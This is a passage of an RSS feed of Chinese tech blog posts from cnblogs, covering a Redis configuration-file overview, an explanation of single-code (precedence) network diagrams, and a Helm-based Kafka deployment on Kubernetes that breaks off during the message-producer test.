<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>跟我一起学Redis之Redis配置文件啃了一遍之后，从尴尬变得有底气了 - Code综艺圈</title>
<link>http://www.cnblogs.com/zoe-zyq/p/13917600.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zoe-zyq/p/13917600.html</guid>
<description>&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;秋高气爽的一天，那时候年轻帅气的我正在参照着搜索引擎写代码，迷之微笑般的敲着键盘(又从搜索引擎上找到代码案例啦)，突然领导在小隔间里传来了呼唤声，然后有了以下场景：&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;领导：小Z，你过来一下；&lt;/p&gt;
&lt;p&gt;当时小年轻的我，拿上纸和笔以迅雷不及掩耳之势般的速度来到领导跟前；&lt;/p&gt;
&lt;p&gt;领导：有个需求，把现在xxx项目的Redis持久化给用上，最好今天下班前搞定，然后用上；&lt;/p&gt;
&lt;p&gt;初碰Redis的我，当时很懵，只会简单的程序操作，只能小声的回复：好的，我回去查查；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;真实案例，短短两句话就把需求沟通完了，肯定是有问题的，不是领导没说清楚，而是当时真是菜的不行，连问啥都不知道。好在最后在同事的帮助之下多次与领导沟通，最终完成任务。&lt;/p&gt;
&lt;p&gt;对于真正做事，上面的工作需求沟通是有很大问题的：比如持久化频率？对持久化数据完整性的要求？这些都不确定，最终可能得到结果就不一样，最主要是这些功能直接通过Redis配置文件修改即可完成，当时听到需求的时候还以为要写程序，心里还想着这么短的时间咋能完成。所以学习很重要，类似于这种通过配置文件进行功能配置的应用实在太多，比如MySql，ngnix等等。&lt;/p&gt;
&lt;p&gt;既然知道是这么回事，肯定要避免下次出现同样的尴尬，于是把Redis配置文件啃了一遍；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正文&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;redis的配置文件注释其实很详细，在配置文件中，用#开头的形式对每个配置项进行描述说明，如下图对端口的说明：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/7OLTpwGFIzaVRWE.png&quot; alt=&quot;image-20201103084343371&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置文件位置，这里仅参考，具体根据本机路径查看：&lt;/p&gt;
&lt;p&gt;windows中与运行程序在一块，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/ZxAmqs5whCUOJTp.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;linux中的配置文件一般默认为：/usr/local/redis/etc/redis.conf&lt;/p&gt;
&lt;p&gt;注：不管是windows还是linux，后续如果需要改配置文件，都建议拷贝一份出来进行修改。&lt;/p&gt;
&lt;p&gt;上菜吧，根据Redis配置文件的分段，将配置进行如下图归类：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/VT4axzPpIFiDcyl.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;本来想以文字的形式归纳总结的，但却不知道如何排版，这里就将其总结成一个思维导图，显得直观，如下：&lt;/p&gt;
&lt;ul readability=&quot;7&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;单位说明(不分大小写)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/6R9yfgzuqTl2nC3.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;INCLUDES(引入外部配置文件)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/N9P6qV3nmbIAKvt.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NETWORK(网络配置)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/QHc2rGRZjN4LS8q.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;GENERAL(常规配置)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/vuQkXglNYjorRP9.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;SNAPSHOTTING(快照，redis持久化的方式之一，保存文件名以.rdb结尾)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/jwQK2qgcMBR48P1.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;REPLICATION(主从复制)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/lA5oOtxi3VWnE1g.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/9bFPgA8CMmTsopY.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SECURITY(安全)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/mlJ5p9SQcin3CfD.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;LIMITS(限制)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/swd1keGhbINxr29.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;APPEND ONLY MODE(追加，Redis持久化方式之二，保存文件名为.aof)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/ibNEjhusG6F84aM.png&quot; alt=&quot;image-20201103085310298&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;LUA SCRIPTING(Lua脚本相关配置)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/KWgTwb8rQolauiX.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;REDIS CLUSTER(Redis集群，实现高可用)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/V9iyzFNPoImQ3jc.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;SLOW LOG(慢查询记录)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/ozGXkQmJ137PLEY.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;LATENCY MONITOR(延时监控)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/XJS3e4zCyO9RLKH.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;ADVANCED CONFIG(高级配置，优化存储，一般都是默认值，这里先不列出来啦)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以上内容只是对Redis配置文件进行解读，后续会针对功能点进行举例演示，比如结合持久化、主从复制、哨兵模式、集群搭建等相关知识点将对应配置进行实例演习，小伙伴敬请期待吧；文中的命令是使用Windows中的配置文件参考的，版本较低，可能命令名称有细微改动，但功能不变。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这节的主要目的是解读配置文件内容，大概理解配置文件中各项配置的意思，当遇见相关需求时，有一个正确的思路，避免文章刚开始那种场景发生到小伙伴身上，至少有讨论的资本，最终把需求快速理解透。下一篇说说Redis事务。&lt;/p&gt;
&lt;p&gt;Redis配置文件整体的脑图已经上传到公众号上，关注&quot;Code综艺圈&quot;，发送&lt;strong&gt;Redis&lt;/strong&gt;即可；&lt;/p&gt;
&lt;blockquote readability=&quot;3.8955223880597&quot;&gt;
&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1lhOyFZ9HZncJGwvrgqtQ_Q&quot;&gt;https://pan.baidu.com/s/1lhOyFZ9HZncJGwvrgqtQ_Q&lt;/a&gt; 提取码: dj99&lt;br/&gt;Redis配置文件.xmind 下载，方便xmind软件打开查看&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;同时整理了一些面试资料，关注公众号“Code综艺圈”，发送&quot;&lt;strong&gt;面试&lt;/strong&gt;&quot;获取下载地址，至于教程，手里的也有一些Web前端、.Net后端、Java的教程，但现在网上资源比较多，大部分小伙伴喜欢在线看；如果有需要，小伙伴可以私聊我，目前先把面试相关的资料放上去，收集内容会持续更新，包含一些大厂面试题，助力小伙伴找到心仪的工作：&lt;/p&gt;
&lt;p&gt;一个被程序搞丑的帅小伙，关注&quot;Code综艺圈&quot;，识别关注跟我一起学~~~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/11/03/lyzqL5HWBaOtfni.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;撸文不易，莫要白瞟，三连走起~~~~&lt;/p&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:56:00 +0000</pubDate>
<dc:creator>Code综艺圈</dc:creator>
<og:description>前言 秋高气爽的一天，那时候年轻帅气的我正在参照着搜索引擎写代码，迷之微笑般的敲着键盘(又从搜索引擎上找到代码案例啦)，突然领导在小隔间里传来了呼唤声，然后有了以下场景： 领导：小Z，你过来一下； 当</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zoe-zyq/p/13917600.html</dc:identifier>
</item>
<item>
<title>一文搞懂什么是单代号网络图！ - 锅外的大佬</title>
<link>http://www.cnblogs.com/liululee/p/13917569.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liululee/p/13917569.html</guid>
<description>&lt;h2 id=&quot;1-概念&quot;&gt;1. 概念&lt;/h2&gt;
&lt;p&gt;前导图法（Precedence Diagramming Method, PDM）,也称之为紧前关系绘图法，是用于编制项目进度网络图的一种方法，它使用方框（称之为&lt;code&gt;节点&lt;/code&gt;）代表活动，节点之间用箭头连接，以显示节点之间的逻辑关系。这种网络图也被称作为单代号网络图（只有节点需要编号）或活动节点图（Active On Node， AON）。&lt;/p&gt;
&lt;p&gt;前导图法包括活动之间存在4种类型的依赖关系，分别是：&lt;/p&gt;
&lt;p&gt;1.结束-开始的关系（F-S型）：前序活动结束后，后续活动才能开始。例如：只有比赛（紧前活动）结束，颁奖地典礼（紧后活动）才能开始。&lt;/p&gt;
&lt;p&gt;2.结束-结束的关系（F-F型）：前序活动结束后，后续活动才能结束。例如：只有完成了文件的编写（紧前后动），才能完成文件的编辑（紧后活动）&lt;/p&gt;
&lt;p&gt;3.开始-开始的关系（S-S型）：前序活动开始后，后续活动才能开始。例如：开始播放伴奏后（紧前活动），才能开始演唱（紧后活动）&lt;/p&gt;
&lt;p&gt;4.开始-结束的关系（S-F型）：前序活动开始后，后续活动才能结束。例如：只有新版本系统提供稳定服务后（紧前活动），旧版本系统才能停止服务（紧后活动）&lt;/p&gt;
&lt;h2 id=&quot;2单代号网络图的特点：&quot;&gt;2.单代号网络图的特点：&lt;/h2&gt;
&lt;p&gt;1、绘图简单，不需要用虚箭线，工作之间的逻辑关系比较容易表达。&lt;/p&gt;
&lt;p&gt;2、单代号网络图相对于双代号网络图更便于检查和修改。&lt;/p&gt;
&lt;p&gt;3、由于单代号网络图的工作持续时间表示在节点内，所以相对不够形象、直观。&lt;/p&gt;
&lt;p&gt;4、使用单代号网络图表示的工作间的逻辑关系，其箭线可能会产生较多的纵横交叉的现象。&lt;/p&gt;
&lt;p&gt;5、当没有节点时间参数时，不能画时标网络图。&lt;/p&gt;
&lt;h2 id=&quot;3单代号网络图绘制规则&quot;&gt;3.单代号网络图绘制规则&lt;/h2&gt;
&lt;p&gt;1、绘图中禁止出现循环回路。&lt;/p&gt;
&lt;p&gt;2、每个节点表示一项工作，所以各节点的代号不能重复。&lt;/p&gt;
&lt;p&gt;3、绘图中禁止出现双向箭头或者无箭头的连线。&lt;/p&gt;
&lt;p&gt;4、使用数字表示工作的名称时，应由小至大按活动先后顺序进行编号。&lt;/p&gt;
&lt;p&gt;5、绘图中禁止出现没有箭尾节点的箭线和没有箭头节点的箭线。&lt;/p&gt;
&lt;p&gt;6、绘图中，箭线不宜交叉，但是当交叉不可避免时，也可以采用过桥法或指向法进行绘制。&lt;/p&gt;
&lt;p&gt;7、在单代号网络途中，只有一个起点节点和一个终点节点。如果在网络图中有多项起点节点或多项终点节点，则应该在网络图的两端分别设置一项虚工作，作为该网络图的起点节点和终点节点。&lt;/p&gt;
&lt;p&gt;8、除了起点节点和终点节点以外，其他所有的节点都应该有指向箭线和背向箭线。&lt;/p&gt;
&lt;p&gt;9、在绘制网络图时，单代号和双代号的画法不能混用。&lt;/p&gt;
&lt;h2 id=&quot;4单代号网络图组成的基本元素：&quot;&gt;4.单代号网络图组成的基本元素：&lt;/h2&gt;
&lt;p&gt;1、节点：表示的是工作，一个节点则表示一个工作。一般用圆圈或者矩形表示。在单代号网络图中节点必须进行编号，且标注在节点内，编号可以间断，但是与双代号网络图一样绝不可以重复。&lt;/p&gt;
&lt;p&gt;2、箭线：表示的是工序之间的逻辑关系。箭线一般用水平直线、折线或者斜线来表示，水平投影时的方向应自左向右，表示的是工作进行的方向。&lt;/p&gt;
&lt;p&gt;3、线路：在单代号网络途中，每条线路都应该用其该线路上的节点编号，依照从小到大的顺序进行表述。&lt;/p&gt;
&lt;h2 id=&quot;5-绘制单代号网络图：&quot;&gt;5. 绘制单代号网络图：&lt;/h2&gt;
&lt;p&gt;图例1：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1692986/202011/1692986-20201103083946123-1467772197.png&quot; alt=&quot;file&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图例2：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1692986/202011/1692986-20201103083949122-1686363256.png&quot; alt=&quot;file&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图例3：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1692986/202011/1692986-20201103083949345-1739562992.png&quot; alt=&quot;file&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;绘制一张单代号网络图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1692986/202011/1692986-20201103083949476-469989104.png&quot; alt=&quot;file&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看完这篇，单代号网络图，你会画了吗？留言告诉我吧！&lt;/p&gt;
&lt;p&gt;如果你觉得文章还不错，记得关注公众号： 锅外的大佬&lt;br/&gt;&lt;a href=&quot;http://developlee.top&quot;&gt;刘一手的博客&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:40:00 +0000</pubDate>
<dc:creator>锅外的大佬</dc:creator>
<og:description>项目管理之进度管理——单代号网络图 1. 概念 前导图法（Precedence Diagramming Method, PDM）,也称之为紧前关系绘图法，是用于编制项目进度网络图的一种方法，它使用方框</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liululee/p/13917569.html</dc:identifier>
</item>
<item>
<title>K8S环境快速部署Kafka(K8S外部可访问) - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/13917562.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/13917562.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;如何快速部署&quot;&gt;如何快速部署&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;借助Helm，只需少量操作即可部署kafka；&lt;/li&gt;
&lt;li&gt;kafka和zookeeper对存储都有需求，若提前准备了StorageClass，存储一事则变得十分简单&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;
&lt;p&gt;本次实战涉及到的K8S、Helm、NFS、StorageClass等前置条件，它们的安装和使用请参考：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/103106314&quot;&gt;《kubespray2.11安装kubernetes1.15》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/103667500&quot;&gt;《部署和体验Helm(2.16.1版本)》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/79498346&quot;&gt;《Ubuntu16环境安装和使用NFS》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105465233&quot;&gt;《K8S使用群晖DS218+的NFS》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105465672&quot;&gt;《K8S的StorageClass实战(NFS)》&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;环境信息&quot;&gt;环境信息&lt;/h3&gt;
&lt;p&gt;本次实战的操作系统和软件的版本信息如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Kubernetes：1.15&lt;/li&gt;
&lt;li&gt;Kubernetes宿主机：CentOS Linux release 7.7.1908&lt;/li&gt;
&lt;li&gt;NFS服务：IP地址&lt;span&gt;192.168.50.135&lt;/span&gt;，文件夹&lt;span&gt;/volume1/nfs-storageclass-test&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Helm：2.16.1&lt;/li&gt;
&lt;li&gt;Kafka：2.0.1&lt;/li&gt;
&lt;li&gt;Zookeeper：3.5.5&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;接下来的实战之前，请您准备好：K8S、Helm、NFS、StorageClass；&lt;/p&gt;
&lt;h3 id=&quot;操作&quot;&gt;操作&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;添加helm仓库(该仓库中有kafka)：&lt;span&gt;helm repo add incubator &lt;a href=&quot;http://storage.googleapis.com/kubernetes-charts-incubator&quot;&gt;http://storage.googleapis.com/kubernetes-charts-incubator&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;下载kafka的chart：&lt;span&gt;helm fetch incubator/kafka&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;下载成功后当前目录有个压缩包：&lt;span&gt;kafka-0.20.8.tgz&lt;/span&gt;，解压：&lt;span&gt;tar -zxvf kafka-0.20.8.tgz&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;进入解压后的kafka目录，编辑&lt;span&gt;values.yaml&lt;/span&gt;文件，下面是具体的修改点：&lt;/li&gt;
&lt;li&gt;首先要设置在K8S之外的也能使用kafka服务，修改&lt;span&gt;external.enabled&lt;/span&gt;的值，改为&lt;span&gt;true&lt;/span&gt;：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083703209-1317937868.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;6. 找到&lt;span&gt;configurationOverrides&lt;/span&gt;，下图两个黄框中的内容原本是注释的，请删除注释符号，另外，如果您之前设置过跨网络访问kafka，就能理解下面写入K8S宿主机IP的原因了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083703763-524361028.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;7. 接下来设置数据卷，找到&lt;span&gt;persistence&lt;/span&gt;，按需要调整大小，再设置已准备好的&lt;span&gt;storageclass&lt;/span&gt;的名称：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083704246-1073350912.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;8. 再设置zookeeper的数据卷：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083704800-2134776234.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;9. 设置完成，开始部署，先创建namespace，执行：&lt;span&gt;kubectl create namespace kafka-test&lt;/span&gt;&lt;br/&gt;10. 在kafka目录下执行：&lt;span&gt;helm install --name-template kafka -f values.yaml . --namespace kafka-test&lt;/span&gt;&lt;br/&gt;11. 如果前面的配置没有问题，控制台提示如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083705261-1072995012.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;12. kafka启动依赖zookeeper，整个启动会耗时数分钟，期间可见zookeeper和kafka的pod逐渐启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083705702-360372467.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;13. 查看服务：kubectl get services -n kafka-test，如下图红框所示，通过&lt;span&gt;宿主机IP:31090、宿主机IP:31091、宿主机IP:31092&lt;/span&gt;即可从外部访问kafka：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083706476-1933446639.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;14. 查看kafka版本：&lt;span&gt;kubectl exec kafka-0 -n kafka-test -- sh -c 'ls /usr/share/java/kafka/kafka_*.jar'&lt;/span&gt; ，如下图红框所示，scala版本&lt;span&gt;2.11&lt;/span&gt;，kafka版本&lt;span&gt;2.0.1&lt;/span&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083707298-2012681348.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;15&quot;&gt;&lt;li&gt;kafka启动成功后，咱们来验证服务是否正常；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;对外暴露zookeeper&quot;&gt;对外暴露zookeeper&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;为了远程操作kafka，有时需要连接到zookeeper，所以需要将zookeeper也暴露出来；&lt;/li&gt;
&lt;li&gt;创建文件&lt;span&gt;zookeeper-nodeport-svc.yaml&lt;/span&gt;，内容如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;apiVersion: v1
kind: Service
metadata:
  name: zookeeper-nodeport
  namespace: kafka-test
spec:
  type: NodePort
  ports:
       - port: 2181
         nodePort: 32181
  selector:
    app: zookeeper
    release: kafka
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;执行命令：&lt;span&gt;kubectl apply -f zookeeper-nodeport-svc.yaml&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;查看服务，发现已经可以通过&lt;span&gt;宿主机IP:32181&lt;/span&gt;访问zookeeper了，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083708344-128009489.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;验证kafka服务&quot;&gt;验证kafka服务&lt;/h3&gt;
&lt;p&gt;找一台电脑安装kafka包，就能通过里面自带的命令远程连接和操作K8S的kafka了：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;访问kafka官网：&lt;a href=&quot;http://kafka.apache.org/downloads&quot;&gt;&lt;span&gt;http://kafka.apache.org/downloads&lt;/span&gt;&lt;/a&gt; ，刚才确定了scala版本&lt;span&gt;2.11&lt;/span&gt;，kafka版本&lt;span&gt;2.0.1&lt;/span&gt;，因此下载下图红框中的版本：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083708897-41380839.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;2. 下载后解压，进入目录&lt;span&gt;kafka_2.11-2.0.1/bin&lt;/span&gt;&lt;br/&gt;3. 查看当前topic：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-topics.sh --list --zookeeper 192.168.50.135:32181
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下图，空空如也：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083709256-2101151683.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;4. 创建topic：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-topics.sh --create --zookeeper 192.168.50.135:32181 --replication-factor 1 --partitions 1 --topic test001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下图，创建成功后再查看topic终于有内容了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083709870-590955213.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;5. 查看名为test001的topic：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-topics.sh --describe --zookeeper 192.168.50.135:32181 --topic test001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083710356-187932658.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;6. 进入创建消息的交互模式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-console-producer.sh --broker-list 192.168.50.135:31090 --topic test001
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;进入交互模式后，输入任何字符串再输入回车，就会将当前内容作为一条消息发送出去：&lt;/p&gt;
